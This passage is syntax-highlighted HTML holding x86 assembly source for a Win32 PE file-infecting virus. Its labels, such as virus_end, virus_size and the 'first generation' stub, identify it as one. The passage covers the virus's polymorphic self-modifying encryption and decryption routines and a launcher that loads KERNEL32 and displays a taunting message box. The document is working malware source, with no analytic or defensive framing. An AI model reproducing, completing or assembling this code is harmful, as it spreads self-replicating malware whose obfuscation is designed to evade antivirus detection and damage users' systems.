            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">4d</span><span class="sc0">               </span><span class="sc1">; Last block shit</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Finished_crypting</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">EncryptBlock</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc5">Finished_crypting</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc1">; Once we have the length, we can start</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">


</span><span class="sc5">Encrypt</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Create_Table</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Encrypt_stuff</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">DeEncryptBlock</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8d</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">OperationTable</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0cfh</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc0">   </span><span class="sc1">; 10 bits * 24 operations</span><span class="sc0">
                                      </span><span class="sc1">;something to adjust</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">24d</span><span class="sc0">

</span><span class="sc5">MakeRound2</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">         </span><span class="sc1">; The above adjustment with this</span><span class="sc0">
                                    </span><span class="sc1">;allows us to do the encryption</span><span class="sc0">
                                    </span><span class="sc1">;algorythm backwards</span><span class="sc0">

               </span><span class="sc1">; 34h XOR, 2CH SUB, 04h ADD, C0h C8h ROL, c0h c0h ROR</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncryptOperation2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">90909090h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">8d</span><span class="sc0">          </span><span class="sc1">; Value to load ( 8 bits )</span><span class="sc0">

            </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">XorOrRox2</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncryptOperation2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">04h</span><span class="sc0">
            </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">SubInst2</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncryptOperation2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">028h</span><span class="sc0">
</span><span class="sc5">SubInst2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">OpCodeStoredA2</span><span class="sc0">

</span><span class="sc5">XorOrRox2</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">DealWithXor2</span><span class="sc0">

</span><span class="sc5">RorOrXor2</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncryptOperation2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0c0c0h</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">MakeRol2</span><span class="sc0">         </span><span class="sc1">; IT'S MADE THE 'OTHER' WAY</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncryptOperation2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc5">MakeRol2</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
                            </span><span class="sc1">; Ecx equ value to load, that is 7 bits for you</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">OpCodeStoredA2</span><span class="sc0">


</span><span class="sc5">DealWithXor2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncryptOperation2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">034h</span><span class="sc0">

</span><span class="sc5">OpCodeStoredA2</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; Now it's time to obtain the cypher</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">MakeValuesForOperation2</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; points to +2 or +3 in the beggining</span><span class="sc0">
            </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">NoOperand2</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc5">NoOperand2</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">MakeValuesForOperation2</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncryptOperation2</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">90h</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Type1B</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncryptOperation2</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">EncryptOperation2</span><span class="sc0">  </span><span class="sc1">; just in case (testing)</span><span class="sc0">
</span><span class="sc5">Type1B</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">EncryptOperation2</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">            </span><span class="sc1">; Prefetch</span><span class="sc0">
                    </span><span class="sc1">; One instruction made ( out of 4 )</span><span class="sc0">

</span><span class="sc5">EncryptOperation2</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc0">   </span><span class="sc1">; work in AL. One byte excess to fit dword</span><span class="sc0">
            </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">8d</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">EncryptOperation2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">SecondCryptB</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">SecondCryptB</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc4">,</span><span class="sc2">90</span><span class="sc0">   </span><span class="sc1">; work in AL. One byte excess to fit dword</span><span class="sc0">


            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FinishedCryptBlock2</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">MakeRound2</span><span class="sc0">
</span><span class="sc5">FinishedCryptBlock2</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">DeMessTwoBlocks</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

            </span><span class="sc1">; First of all, we get seven bits from the beggining of the</span><span class="sc0">
            </span><span class="sc1">;table, that is, the offset relative to the table in bits</span><span class="sc0">
            </span><span class="sc1">;to get our value.</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDl</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@DlHere</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc0">        </span><span class="sc1">; beggining of that last 8 bits</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">@Test_Rotate</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@OperationBlock</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">2bh</span><span class="sc0">   </span><span class="sc1">; sub esi, eax</span><span class="sc0">
            </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">@OperationBlock</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">@OperationBlock</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">33h</span><span class="sc0">   </span><span class="sc1">; xor esi, eax</span><span class="sc0">
</span><span class="sc5">@OperationBlock</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc0">

            </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">

            </span><span class="sc6">bt</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">@We_Dont_Rotate</span><span class="sc0">

            </span><span class="sc1">; If we do rotate, we do it now, with dl value</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc0">
</span><span class="sc5">@DlHere</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

            </span><span class="sc1">; Rotated or not, the second bunch is still in EAX, while</span><span class="sc0">
            </span><span class="sc1">;the first one is in ESI. So, we test the second byte.</span><span class="sc0">

</span><span class="sc5">@We_Dont_Rotate</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@Test_Rotate</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

            </span><span class="sc6">ret</span><span class="sc0">




</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">


</span><span class="sc5">DeEncrypt64KbBlocks</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc1">; This function is performed in reverse order than</span><span class="sc0">
            </span><span class="sc1">;"Encrypt64KbBlocks", first fixing the block mixing</span><span class="sc0">
            </span><span class="sc1">;and later decrypting each block.</span><span class="sc0">

            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeMessTwoBlocks</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeEncryptBlock</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeEncryptBlock</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">


</span><span class="sc5">DeEncrypt_stuff</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetBlocksReminder</span><span class="sc0">       </span><span class="sc1">; DX is the last one length</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">CheckLasting2</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; DX = REMAINDER, CX = NUMBER O BLOCKS</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">                   </span><span class="sc1">; No more ?</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Go_last_block2</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeEncrypt64KbBlocks</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">StoreOneBlock</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">CheckLasting2</span><span class="sc0">

</span><span class="sc5">Go_last_block2</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">4d</span><span class="sc0">               </span><span class="sc1">; Last block shit</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Thisisfinished</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeEncryptBlock</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc5">Thisisfinished</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">


</span><span class="sc5">Decrypt</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DeEncrypt_stuff</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">OperationTable</span><span class="sc4">:</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">31d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; 30 for 24 operations, 1 for last one</span><span class="sc0">


</span><span class="sc5">virus_end</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
</span><span class="sc5">virus_size</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc5">v_start</span><span class="sc0">




</span><span class="sc1">;                   FIRST GENERATION ONLY</span><span class="sc0">



</span><span class="sc5">diff_external</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">external_first_gen_ops</span><span class="sc4">-</span><span class="sc5">Decryption</span><span class="sc0">

</span><span class="sc5">external_first_gen_ops</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">Kernel32</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; GetModuleHandle for the</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;first virus segregation.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">GetMHandle</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">external_address</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc5">diff_external</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Kernel32</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'KERNEL32.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">First_out</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">MB_ICONEXCLAMATION</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Azathoth</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WriteOurText</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">NULL</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc5">WriteOurText</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'H0 H0 H0 NOW I HAVE A MACHINE GUN'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">


</span><span class="sc9">include</span><span class="sc0">     </span><span class="sc5">Win32api.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">     </span><span class="sc5">PE.inc</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">

</span></div></body>
</html>
